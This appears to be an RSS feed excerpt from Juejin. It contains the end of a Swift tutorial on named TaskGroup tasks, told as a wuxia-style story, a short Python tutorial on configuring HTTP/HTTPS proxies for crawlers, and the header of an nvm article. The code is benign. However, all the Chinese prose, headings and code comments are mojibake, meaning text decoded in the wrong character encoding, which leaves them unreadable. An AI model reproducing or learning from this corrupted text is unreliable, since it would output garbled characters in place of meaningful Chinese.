    <span class="hljs-keyword">let</span> id: <span class="hljs-type">Int</span>
    <span class="hljs-keyword">let</span> title: <span class="hljs-type">String</span> <span class="hljs-comment">// æ¯”å¦‚ "ä»¤ç‹å†²å› é…—é…’è¢«ç½šæ¬¾"</span>
    <span class="hljs-keyword">let</span> strap: <span class="hljs-type">String</span>
    <span class="hljs-keyword">let</span> url: <span class="hljs-type">URL</span>
}
</code></pre>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>TaskGroup</code> æ´¾å‡ºå¤šåæ¢å­ï¼ˆå­ä»»åŠ¡ï¼‰å»æ‰“æ¢æ¶ˆæ¯ã€‚å¦‚æœæœ‰æ¢å­å›æŠ¥å¤±è´¥ï¼Œæˆ‘ä»¬éœ€è¦ç«‹åˆ»çŸ¥é“æ˜¯å“ªä¸€è·¯æ¢å­å‡ºäº†é—®é¢˜ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> stories <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> withTaskGroup { group <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">5</span> {
        <span class="hljs-comment">// å…³é”®ç‚¹æ¥äº†ï¼ğŸ‘‡</span>
        <span class="hljs-comment">// æˆ‘ä»¬åœ¨æ·»åŠ ä»»åŠ¡æ—¶ï¼ŒåŠ¨æ€åœ°ç»™å®ƒç”Ÿæˆäº†åå­—ï¼š "Stories 1", "Stories 2"...</span>
        <span class="hljs-comment">// è¿™å°±åƒæ˜¯å²³ä¸ç¾¤ç»™å¼Ÿå­ä»¬æ’è¾ˆåˆ†ï¼Œä¸€ç›®äº†ç„¶ã€‚</span>
        group.addTask(name: <span class="hljs-string">"æ±Ÿæ¹–å¿«æŠ¥åˆ†é˜Ÿ-<span class="hljs-subst">\(i)</span>"</span>) {
            <span class="hljs-keyword">do</span> {
                <span class="hljs-keyword">let</span> url <span class="hljs-operator">=</span> <span class="hljs-type">URL</span>(string: <span class="hljs-string">"https://hws.dev/news-<span class="hljs-subst">\(i)</span>.json"</span>)<span class="hljs-operator">!</span>
                <span class="hljs-keyword">let</span> (data, <span class="hljs-keyword">_</span>) <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">URLSession</span>.shared.data(from: url)
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-type">JSONDecoder</span>().decode([<span class="hljs-type">NewsStory</span>].<span class="hljs-keyword">self</span>, from: data)
            } <span class="hljs-keyword">catch</span> {
                <span class="hljs-comment">// ğŸš¨ å‡ºäº‹äº†ï¼</span>
                <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰“å°å‡º Task.name</span>
                <span class="hljs-comment">// è¾“å‡ºç¤ºä¾‹ï¼š"Loading æ±Ÿæ¹–å¿«æŠ¥åˆ†é˜Ÿ-3 failed."</span>
                <span class="hljs-comment">// å²³çµçŠç¬é—´å°±èƒ½çŸ¥é“æ˜¯ç¬¬ 3 åˆ†é˜Ÿè¢«é’åŸæ´¾æˆªæ€äº†ï¼</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"åŠ è½½å¤±è´¥ï¼Œè‚‡äº‹è€…æ˜¯: <span class="hljs-subst">\(Task.name <span class="hljs-operator">??</span> <span class="hljs-string">"Unknown"</span>)</span>"</span>)
                <span class="hljs-keyword">return</span> []
            }
        }
    }

    <span class="hljs-keyword">var</span> allStories <span class="hljs-operator">=</span> [<span class="hljs-type">NewsStory</span>]()

    <span class="hljs-comment">// æ”¶é›†æƒ…æŠ¥</span>
    <span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> stories <span class="hljs-keyword">in</span> group {
        allStories.append(contentsOf: stories)
    }

    <span class="hljs-comment">// æŒ‰ ID æ’åºï¼Œä¿æŒé˜Ÿå½¢</span>
    <span class="hljs-keyword">return</span> allStories.sorted { <span class="hljs-variable">$0</span>.id <span class="hljs-operator">&gt;</span> <span class="hljs-variable">$1</span>.id }
}

<span class="hljs-built_in">print</span>(stories)
</code></pre>
<h2 data-id="heading-4">3ï¸âƒ£ ğŸ’” å²³çµçŠçš„é¡¿æ‚Ÿ</h2>
<p>çœ‹å®Œè¿™æ®µä»£ç ï¼Œå²³çµçŠç ´æ¶•ä¸ºç¬‘ï¼šâ€œå¤ªå¥½äº†ï¼è¿™æ ·ä¸€æ¥ï¼Œå¦‚æœâ€˜å¯»æ‰¾å¹³ä¹‹â€™çš„ä»»åŠ¡å¤±è´¥äº†ï¼Œæˆ‘å°±èƒ½ç«‹åˆ»çŸ¥é“æ˜¯å“ªä¸€æ¬¡å°è¯•å¤±è´¥çš„ï¼Œæ˜¯åœ¨ç¦å·å¤±è´¥çš„ï¼Œè¿˜æ˜¯åœ¨æ´›é˜³å¤±è´¥çš„ï¼Œå†ä¹Ÿä¸ç”¨å¯¹ç€è™šç©ºå“­æ³£äº†ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/914ba42826894963b8e27cf710668643~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=vPdTlvIpZprRT1ysSChBgUHRFps%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ä¾¯ä½©ç‚¹ç‚¹å¤´ï¼Œè¯­é‡å¿ƒé•¿åœ°è¯´ï¼šâ€œåœ¨å¹¶å‘çš„ä¸–ç•Œé‡Œï¼Œ<strong>å¯è§æ€§ï¼ˆVisibilityï¼‰</strong> å°±æ˜¯ç”Ÿå‘½çº¿ã€‚ä¸€ä¸ªæœªå‘½åçš„ä»»åŠ¡ï¼Œå°±æ˜¯ unpredictableï¼ˆä¸å¯é¢„æµ‹ï¼‰çš„é£é™©ã€‚ç»™äº†å®ƒåå­—ï¼Œå°±æ˜¯ç»™äº†å®ƒè´£ä»»ã€‚å¦‚æœå®ƒè·‘è·¯äº†ï¼ˆRogue Taskï¼‰ï¼Œæˆ‘ä»¬è‡³å°‘çŸ¥é“é€šç¼‰ä»¤ä¸Šè¯¥å†™è°çš„åå­—ã€‚â€</p>
<p>å²³çµçŠçœ‹ç€å±å¹•ä¸Šä¸€ä¸ªä¸ªæ¸…æ™°çš„ä»»åŠ¡åç§°ï¼Œçœ¼ä¸­é—ªè¿‡ä¸€ä¸å¤æ‚çš„ç¥è‰²ï¼šâ€œæ˜¯å•Šï¼Œåå­—å¾ˆé‡è¦ã€‚å¯æƒœï¼Œæœ‰äº›äººçš„åå­—ï¼Œåˆ»åœ¨äº†å¿ƒä¸Šï¼Œå´åœ¨æ±Ÿæ¹–é‡Œä¸¢äº†â€¦â€¦â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47c748073b704cb0a028684573cbd441~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=gOZoh9kWe8a618uiqaW3RGenERk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œåœåœåœï¼â€ä¾¯ä½©èµ¶ç´§æ‰“æ–­å¥¹ï¼Œç”Ÿæ€•å¥¹åˆå”±èµ·é‚£é¦–ç¦å»ºå±±æ­Œï¼Œâ€œå’±ä»¬æ˜¯ææŠ€æœ¯çš„ï¼Œä¸å…´æä¼¤ç—•æ–‡å­¦ã€‚ç°åœ¨çš„é‡ç‚¹æ˜¯ï¼Œä½ çš„ Debug æ•ˆç‡æå‡äº† 1000%ï¼â€</p>
<h2 data-id="heading-5">4ï¸âƒ£ ğŸ¼ ç†ŠçŒ«çš„å“²å­¦æ—¶åˆ»</h2>
<p>ä¾¯ä½©ç«™èµ·èº«ï¼Œæ‹äº†æ‹å±è‚¡ä¸Šçš„ç°å°˜ï¼ˆè™½ç„¶æ˜¯å…¨æ¯æŠ•å½±ï¼Œä½†ä»–è§‰å¾—è¦æœ‰ä»ªå¼æ„Ÿï¼‰ã€‚</p>
<p>â€œå…¶å®ï¼Œç»™ä»£ç èµ·åå­—å’Œåšç†Šä¸€æ ·ã€‚æˆ‘å«ä¾¯ä½©ï¼Œæ‰€ä»¥æˆ‘çŸ¥é“æˆ‘è¦åƒç«¹ç¬‹ï¼Œæˆ‘çŸ¥é“æˆ‘<strong>å¤´ç»å¯¹ä¸ç§ƒ</strong>ï¼Œæˆ‘çŸ¥é“æˆ‘è¦èµ°å“ªæ¡è·¯ï¼ˆè™½ç„¶ç»å¸¸èµ°é”™ï¼‰ã€‚å¦‚æœæˆ‘åªæ˜¯ä¸€åªâ€˜Anonymous Pandaâ€™ï¼Œé‚£æˆ‘å¯èƒ½æ—©å°±è¢«æŠ“å»åŠ¨ç‰©å›­æ‰“å·¥äº†ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b286db7711e45298f22ddd6364946ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=hSVF1QZjE5nKpNb7pXH%2FTzNTcK0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œå–„ç”¨ <code>Task Naming</code>ï¼Œâ€ä¾¯ä½©æ€»ç»“é“ï¼Œâ€œå®ƒä¸ä¼šå¢åŠ è¿è¡Œæ—¶çš„è´Ÿæ‹…ï¼Œä½†åœ¨ä½ ç„¦å¤´çƒ‚é¢ä¿® Bug çš„æ—¶å€™ï¼Œå®ƒå°±æ˜¯é‚£ä¸ªä¸ºä½ æŒ‡ç‚¹è¿·æ´¥çš„â€˜é£æ¸…æ‰¬â€™ã€‚â€</p>
<h2 data-id="heading-6">5ï¸âƒ£ ğŸ›‘ å°¾å£°ï¼šç«¹ç¬‹çš„æ”¶çº³éš¾é¢˜</h2>
<p>å¸®å²³çµçŠè§£å†³äº†å¿ƒç—…ï¼Œä¾¯ä½©å‡†å¤‡æ”¶æ‹¾ä¸œè¥¿ç¦»å¼€èµ›åšåå±±ã€‚ä»–çœ‹ç€è‡ªå·±è¿˜æ²¡åƒå®Œçš„ä¸€å¤§å †ç«¹ç¬‹ï¼Œé™·å…¥äº†æ²‰æ€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/926c282b3afa47d488cef63830e7fa65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=duleFud%2BA5PVn40nVoAOT3w7LuQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œè¿™ç«¹ç¬‹å¤ªå¤šäº†ï¼Œâ€ä¾¯ä½©å˜Ÿå›”ç€ï¼Œâ€œç”¨æ™®é€šçš„ <code>Array</code> è£…å§ï¼Œå¤ªçµæ´»ï¼Œå†…å­˜è·³æ¥è·³å»çš„ï¼Œå½±å“æˆ‘æ‹”åˆ€ï¼ˆåƒç¬‹ï¼‰çš„é€Ÿåº¦ã€‚ç”¨ <code>Tuple</code> å…ƒç»„è£…å§ï¼Œå›ºå®šæ˜¯å›ºå®šäº†ï¼Œä½†è¿™å†™æ³•ä¹Ÿå¤ªä¸‘äº†ï¼Œè€Œä¸”è¿˜æ²¡æ³•ç”¨ä¸‹æ ‡å¾ªç¯è®¿é—®â€¦â€¦â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2eea1f2013f243319cf9965804204a68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=TYux%2BkYuJgd5Hf%2B44q%2FKuZm70wM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å²³çµçŠçœ‹ç€ä¾¯ä½©å¯¹ç€ä¸€å †ç«¹ç¬‹å‘æ„ï¼Œå¿ä¸ä½é—®é“ï¼šâ€œä¾¯å¤§å“¥ï¼Œä½ æ˜¯æƒ³è¦ä¸€ä¸ªæ—¢æœ‰å…ƒç»„çš„â€˜å›ºå®šå¤§å°â€™è¶…èƒ½åŠ›ï¼Œåˆæœ‰æ•°ç»„çš„â€˜ä¸‹æ ‡è®¿é—®â€™ä¾¿æ·æ€§çš„å®¹å™¨å—ï¼Ÿâ€</p>
<p>ä¾¯ä½©çœ¼ç›ä¸€äº®ï¼šâ€œçŸ¥æˆ‘è€…ï¼Œå²³å§‘å¨˜ä¹Ÿï¼éš¾é“ Swift 6.2 è¿è¿™ä¸ªéƒ½æœ‰ï¼Ÿâ€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb4688518ee54019bc8222cb5a6227c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=ZyFYeIkmW0XGJzOjn2xstXpzPvo%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å²³çµçŠå¾®å¾®ä¸€ç¬‘ï¼ŒæŒ‡å‘äº†ä¸‹ä¸€ç« çš„ä¼ é€é—¨ï¼šâ€œå¬è¯´ä¸‹ä¸€å›ï¼Œæœ‰ä¸€ç§ç¥å¥‡çš„å…µå™¨ï¼Œå«åš <strong>InlineArray</strong>ï¼Œä¸“é—¨æ²»æ„ˆä½ çš„â€˜æ€§èƒ½å¼ºè¿«ç—‡â€™ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/049764f7273642689f99e9eea36dcea5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=GJaABCYrVl%2FwGeeuOqdyTffWfWQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p><strong>ï¼ˆæ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œä¸”çœ‹ä¸‹å›åˆ†è§£ï¼šInlineArray â€”â€” å½“å…ƒç»„å’Œæ•°ç»„ç”Ÿäº†ä¸ªæ··è¡€å„¿ï¼Œç†ŠçŒ«çš„ç«¹ç¬‹ç»ˆäºæœ‰åœ°å„¿æ”¾äº†ã€‚ï¼‰</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1b680a865244ec093beaaab072db6b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=5DTKUTynqygHh3%2F0QyOFMGw5ZXU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pythonç½‘ç»œçˆ¬è™«ä¸­HTTPå’ŒHTTPSä»£ç†çš„å®Œæ•´ä½¿ç”¨æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7589206614929244200</link>    <guid>https://juejin.cn/post/7589206614929244200</guid>    <pubDate>2025-12-30T02:24:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589206614929244200" data-draft-id="7589181008098770959" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pythonç½‘ç»œçˆ¬è™«ä¸­HTTPå’ŒHTTPSä»£ç†çš„å®Œæ•´ä½¿ç”¨æ•™ç¨‹"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-30T02:24:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€å¿ƒçŒ´çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2179705232165364"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pythonç½‘ç»œçˆ¬è™«ä¸­HTTPå’ŒHTTPSä»£ç†çš„å®Œæ•´ä½¿ç”¨æ•™ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2179705232165364/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€å¿ƒçŒ´çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:24:23.000Z" title="Tue Dec 30 2025 02:24:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>pythonä½¿ç”¨httpã€httpsä»£ç†</p>
<p>åœ¨å›½å†…åˆ©ç”¨Pythonä»Internetä¸Šçˆ¬å–æ•°æ®æ—¶ï¼Œæœ‰äº›ç½‘ç«™æˆ–APIæ¥å£è¢«é™é€Ÿæˆ–å±è”½ï¼Œè¿™æ—¶ä½¿ç”¨ä»£ç†å¯ä»¥åŠ é€Ÿçˆ¬å–è¿‡ç¨‹ï¼Œå‡å°‘è¯·æ±‚å¤±è´¥ï¼ŒPythonç¨‹åºä½¿ç”¨ä»£ç†çš„æ–¹æ³•ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<p>ï¼ˆ1ï¼‰å¦‚æœæ˜¯åœ¨ä»£ç ä¸­ä½¿ç”¨ä¸€äº›ç½‘ç»œåº“æˆ–çˆ¬è™«æ¡†æ¶è¿›è¡Œæ•°æ®çˆ¬å–ï¼Œä¸€èˆ¬è¿™ç§æ¡†æ¶éƒ½ä¼šæ”¯æŒè®¾ç½®ä»£ç†ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">
import urllib.request as urlreq
<span class="hljs-attr">ph</span> = urlreq.ProxyHandler({<span class="hljs-string">'https'</span>: <span class="hljs-string">'https://127.0.0.1:1080'</span>})
<span class="hljs-attr">oper</span> = urlreq.build_opener(ph)
urlreq.install_opener(oper)
<span class="hljs-attr">res</span> = oper.open(<span class="hljs-string">"https://www.google.com"</span>)
print(res.read())
</code></pre>
<pre><code class="hljs"/></pre>
<pre><code class="hljs language-dart" lang="dart">
<span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req
<span class="hljs-built_in">print</span>(req.<span class="hljs-keyword">get</span>(<span class="hljs-string">"https://www.google.com"</span>, proxies={<span class="hljs-string">'https'</span>: <span class="hljs-string">'https://127.0.0.1:1080'</span>}).content)
</code></pre>
<p>ï¼ˆ2ï¼‰å¦‚æœä½¿ç”¨çš„åº“æ²¡æœ‰æä¾›è®¾ç½®ä»£ç†çš„æ¥å£ï¼Œä½†æ˜¯åº•å±‚ä½¿ç”¨äº†urllibã€requestsç­‰åº“ï¼Œå¯ä»¥å°è¯•è®¾ç½®HTTP_PROXY å’ŒHTTPS_PROXYç¯å¢ƒå˜é‡ï¼Œå¸¸ç”¨çš„ç½‘ç»œåº“ä¼šè‡ªåŠ¨è¯†åˆ«è¿™äº›ç¯å¢ƒå˜é‡ï¼Œä½¿ç”¨å˜é‡è®¾ç½®çš„ä»£ç†å‘èµ·è¯·æ±‚ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-lua" lang="lua">
import <span class="hljs-built_in">os</span>
<span class="hljs-built_in">os</span>.environ[<span class="hljs-string">'http_proxy'</span>] = <span class="hljs-string">'http://127.0.0.1:1080'</span>
<span class="hljs-built_in">os</span>.environ[<span class="hljs-string">'https_proxy'</span>] = <span class="hljs-string">'https://127.0.0.1:1080'</span>
</code></pre>
<p>ï¼ˆ3ï¼‰å¦‚æœä¸Šè¿°ä¸¤ç§æ–¹æ³•éƒ½æ²¡æœ‰ç”¨ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ä½¿ç”¨ä¸€äº›å¯ä»¥ç›‘å¬ã€æ‹¦æˆªå’Œä¿®æ”¹ç½‘ç»œåŒ…çš„å·¥å…·å’Œåº“å¦‚ï¼ˆFiddlerã€mitmproxyã€Sniffmasterï¼‰æ¥æ‹¦æˆªhttpè¯·æ±‚åŒ…å¹¶ä¿®æ”¹åœ°å€ï¼Œè¾¾åˆ°ä½¿ç”¨ä»£ç†çš„æ•ˆæœã€‚Sniffmasteræ˜¯ä¸€æ¬¾å…¨å¹³å°æŠ“åŒ…å·¥å…·ï¼Œæ”¯æŒHTTPSã€TCPå’ŒUDPåè®®æŠ“åŒ…ï¼Œæ— éœ€è®¾ç½®ä»£ç†å³å¯è§£å¯†HTTPSæµé‡ï¼Œè¿˜æä¾›ä»£ç†æŠ“åŒ…åŠŸèƒ½ï¼Œé€‚ç”¨äºå¤šç§è®¾å¤‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€å·¥å…·ç¯‡ã€‘ä½¿ç”¨ nvm è¿›è¡Œ node ç‰ˆæœ¬ç®¡ç†]]></title>    <link>https://juejin.cn/post/7589171972447060010</link>    <guid>https://juejin.cn/post/7589171972447060010</guid>    <pubDate>2025-12-30T02:29:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589171972447060010" data-draft-id="7589171972446961706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€å·¥å…·ç¯‡ã€‘ä½¿ç”¨ nvm è¿›è¡Œ node ç‰ˆæœ¬ç®¡ç†"/> <meta itemprop="keywords" content="å‰ç«¯,Node.js,NPM"/> <meta itemprop="datePublished" content="2025-12-30T02:29:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é—²äº‘ä¸€é¹¤"/> <meta itemprop="url" content="https://juejin.cn/user/729731452122382"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> 